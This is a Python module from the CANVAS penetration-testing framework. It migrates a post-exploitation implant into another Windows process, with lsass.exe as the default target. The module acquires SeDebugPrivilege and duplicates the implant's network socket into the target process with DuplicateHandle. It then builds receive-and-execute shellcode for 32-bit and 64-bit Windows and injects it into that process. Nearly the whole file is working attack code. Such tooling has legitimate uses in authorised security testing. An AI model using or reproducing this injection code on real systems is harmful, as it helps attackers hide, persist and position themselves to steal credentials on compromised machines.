#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import shellcode.shellcodeGenerator as shellcodeGenerator
import shellcode.standalone.windows.secondstages64 as secondstages64

NAME                   = "MOSDEF Migrate"
DESCRIPTION            = "MOSDEF Process Migration"
DOCUMENTATION          = {}
VERSION                = "1.0"
PROPERTY               = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['ARCH']       = [ ["Windows"] ]

DOCUMENTATION['Notes'] = """
This module allows you to migrate the MOSDEF thread into another process via DuplicateHandle. This means
you can move the existing current MOSDEF into another process whilst keeping the current connection.

Please note that to migrate MOSDEF, you have to have the current MOSDEF node selected as the first node.
It will pop up a new listener shell once the MOSDEF thread is migrated into the new process.

Works for all Windows versions up to 7, 32 and 64bit.
"""

NOTES = """
commandline usage: runmodule mosdefmigrate -O pid:666

Sometimes the process we're in does not have SeDebugPrivilege
so we use a call to our getpriv module to get it.
"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name    = NAME
        self.node    = None
        self.pid     = "lsass.exe"
        self.new_api = False # True if NtCreateThreadEx is available

    def neededListenerTypes(self):
        return []

    def getRemoteSocket(self, pid):
        """ duplicates a local socket for a remote process """
        injectVars = {}
        injectVars["PID"] = pid
        injectVars["PROCESS_ALL_ACCESS"] = 0x001F0FFF
        injectVars["MOSDEF_SOCKET"] = self.node.shell.fd
        ntype = self.node.nodetype

        self.nlog("Attempting to migrate SOCKET %d into pid %d" % (self.node.shell.fd, pid))

        if ntype == "win32Node":
            injectCode = """
            #import "remote", "kernel32.dll|OpenProcess" as "OpenProcess"
            #import "remote", "kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
            #import "remote", "kernel32.dll|DuplicateHandle" as "DuplicateHandle"
            #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
            #import "int", "MOSDEF_SOCKET" as "MOSDEF_SOCKET"
            """

        elif ntype == "win64Node":
            injectCode = """
            #import "local", "kernel32.dll|OpenProcess" as "OpenProcess"
            #import "local", "kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
            #import "local", "kernel32.dll|DuplicateHandle" as "DuplicateHandle"
            #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"
            #import "local", "sendlonglong" as "sendlonglong"
            #import "long long", "MOSDEF_SOCKET" as "MOSDEF_SOCKET"
            """

        injectCode += """
        #import "local", "sendint" as "sendint"
        #import "int", "PROCESS_ALL_ACCESS" as "PROCESS_ALL_ACCESS"
        #import "int", "PID" as "PID"

        void main()
        {
        """

        if ntype == "win32Node":
            injectCode += """
                int pHandle;
                int pSocket;
                int sHandle;
                int rVal;
            """

        elif ntype == "win64Node":
            injectCode += """
                long long pHandle;
                long long pSocket;
                long long sHandle;
                int rVal;
            """

        injectCode += """
            sHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());
            if (sHandle == 0)
            {
                sendint(0);
                return;
            }

            // PROCESS_DUP_HANDLE (0x0040)
            // get a handle to the process we want to migrate too (must have 0x40)
            pHandle = OpenProcess(0x47a, 0, PID);
            if (pHandle == 0)
            {
                sendint(0);
                return;
            }


            pSocket = 0;

            // duplicate the handle over to the pHandle
            // DUPLICATE_CLOSE_SOURCE = 1, DUPLICATE_SAME_ACCESS = 2
            rVal = DuplicateHandle(sHandle, MOSDEF_SOCKET, pHandle, &pSocket, 0, 0, 2);

            // k, so now pSocket is a valid SOCKET in the remote procecss hopefully
            if (rVal == 0)
            {
                sendint(0);
                return;
            }

            CloseHandle(sHandle);
            CloseHandle(pHandle);
            """

        if ntype == "win32Node":
            injectCode += """
            sendint(pSocket);
            }
            """
        elif ntype == "win64Node":
            injectCode += """
            sendlonglong(pSocket);
            }
            """

        self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(injectCode, injectVars)
        self.node.shell.sendrequest(message)
        ret = self.node.shell.readint() if ntype == "win32Node" else self.node.shell.readlonglong()
        self.node.shell.leave()
        return ret

    def getMosdefLoop(self, pSocket):
        """ returns a mosdef loop payload with an fd set """
        ntype = self.node.nodetype

        if ntype == "win32Node":
            self.nlog("Generating 32bit Mosdef Shellcode")
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",None)

            # we might be going into a process that doesn't have winsock loaded !
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)

            # XXX: to be DEP safe it needs an VirtualAlloc loop that just makes sre
            # XXX: code ends up in RWX paged memory, and not on the stack ;)
            sc.addAttr("RecvExecAllocLoop", {"fd" : pSocket})
            sc.addAttr("ExitThread", {"closesocket":True})

            return sc.get()

        elif ntype == "win64Node":
            self.nlog("Generating 64bit Mosdef Shellcode")
            p = secondstages64.SecondStages()
            asm = p.recvExecAllocLoopWithSocket(pSocket)
            return p.assemble(asm)

        else:
            # XXX:
            self.log_error("Node type not supported")

    def getArgs(self):
        """ get all the arguments from the commandline or gui """
        self.pidorname = self.argsDict.get("pid", self.pid)


    def run(self):
        self.setInfo("mosdefmigrate - running")
        self.getArgs()
        self.node = self.argsDict["passednodes"][0]

        ntype = self.node.nodetype

        if ntype not in ("win32Node", "win64Node"):
            self.log_error("Currently only win nodes support mosdef migrate")
            self.setInfo("mosdefmigrate - (done) - did not run on this node")
            return 0

        self.pid = self.pidfromname(self.pidorname, self.node)

        if self.pid in [-1, 0]:
            self.log_error("Was not able to get the pid for %s" % self.pid)
            self.setInfo("mosdefmigrate - done - could not find pid for %s" % self.pid)
            return 0

        if self.node.shell.usingISAPI():
            self.log_error("Cannot migrate nodes that are using ISAPI tunneling. Please use the processinject module instead")
            self.setInfo("mosdefmigrate - (done) - did not run on this node")
            return 0

        # get SeDebugPrivilege if needed
        self.nlog("Checking if we need SeDebugPrivilege")
        self.exploitnodes("getpriv", [self.node], {"privname":"SeDebugPrivilege"})

        if self.node.shell.has_wow_64:
            # Try and cover all cases
            try:
                target_is_wow64 = self.node.shell.IsWow64Process(self.pid)
            except Exception, ex:
                self.setInfo("mosdefmigrate - (done) - could not OpenProcess")
                return 0

            if ntype == "win64Node" and target_is_wow64:
                self.log_error('Cannot migrate from win64Node to 32bit process, aborting')
                self.setInfo('mosdefmigrate - (done) - did not run on this node')
                return 0

            if ntype == "win32Node" and self.node.shell.IsWow64Process() and not target_is_wow64:
                self.log_error('Cannot migrate from win32Node to a 64bit process, aborting')
                self.setInfo('mosdefmigrate - (done) - did not run on this node')
                return 0

        self.nlog("Injecting into pid %d" % self.pid)
        self.new_api = self.node.shell.create_thread_ex_check()
        # self.log("Checking for NtCreateThreadEx: %s" % self.new_api)

        # get the migrated socket
        pSocket = self.getRemoteSocket(self.pid)
        if (pSocket == 0):
            self.log_error("Error migrating SOCKET")
            self.setInfo("mosdefmigrate - done - error migrating socket")
            return 0

        # save the old socket
        lSocket = self.node.shell.fd

        self.log_info("Migrated SOCKET %d to a remote SOCKET %d" % (lSocket, pSocket))

        # get the MOSDEF loop code
        mLoop = self.getMosdefLoop(pSocket)

        ret = self.node.shell.injectintopid(self.pid, mLoop, exit_success=True, socket_handle=lSocket)
        if ret == 0:
            self.log_error('Injection failed, aborting')
            self.setInfo('mosdefmigrate - done - error during injection')
            return 0

        # turn DES off for the new node !
        self.node.shell.doDes = False

        # upgrade to the new socket
        self.node.shell.fd = pSocket

        # upgrade the localfunctions
        # self.node.shell.initLocalFunctions()
        rfc = self.node.shell.remotefunctioncache

        if ntype == "win32Node":
            A = rfc["kernel32.dll|getprocaddress"]
            B = rfc["kernel32.dll|loadlibrarya"]
        elif ntype == "win64Node":
            A = rfc["kernel32.dll|GetProcAddress"]
            B = rfc["kernel32.dll|LoadLibraryA"]
            D = rfc["ws2_32.dll|WSAGetLastError"]

        C = rfc["ws2_32.dll|send"]

        # clear the caches for the new node
        self.node.shell.remotefunctioncache = {}

        #here we save the things in kernel32 or ntdll since
        #those can't be rebased (As far as we are concerned!)
        #It looks like we also assume ws2_32 hasn't been rebased
        #which is not strictly true! (is it?)
        if False: #turn this off for now - causing problems?
            for a in rfc:
                if a.count("kernel32.dll|") or a.count("ntdll.dll|"):
                    self.node.shell.remotefunctioncache[a]=rfc[a]

        self.node.shell.clearlocalcache()
        self.node.shell.clearfunctioncache()

        # upgrade the localfunctions
        self.node.shell.initLocalFunctions()

        if ntype == "win32Node":
            self.node.shell.remotefunctioncache["kernel32.dll|getprocaddress"] = A
            self.node.shell.remotefunctioncache["kernel32.dll|loadlibrarya"] = B
        elif ntype == "win64Node":
            self.node.shell.remotefunctioncache["kernel32.dll|GetProcAddress"] = A
            self.node.shell.remotefunctioncache["kernel32.dll|LoadLibraryA"] = B
            self.node.shell.remotefunctioncache["ws2_32.dll|WSAGetLastError"] = D

        self.node.shell.remotefunctioncache["ws2_32.dll|send"] = C

        self.nlog("MOSDEF migrated to pid: %d" % self.pid)

        #here we have a list of things that are going to change if you change process!
        for known in ["PID", "processname"]:
            self.node.forget(known)

        self.node.shell.getprocaddress("kernel32.dll|GlobalAlloc")
        self.node.shell.getprocaddress("kernel32.dll|GlobalFree")
        self.node.shell.getprocaddress("ws2_32.dll|recv")

        # preserve the original nodeID (inherited from the parentnode)
        #self.log("[!] Preserving MOSDEF Node ID %d from %d"% (self.node.nodeID, self.node.parentnode.nextID))
        #self.node.parentnode.preserveID = True

        self.setInfo("mosdefmigrate - done - migrated into %s" % self.pidorname)
        return 1
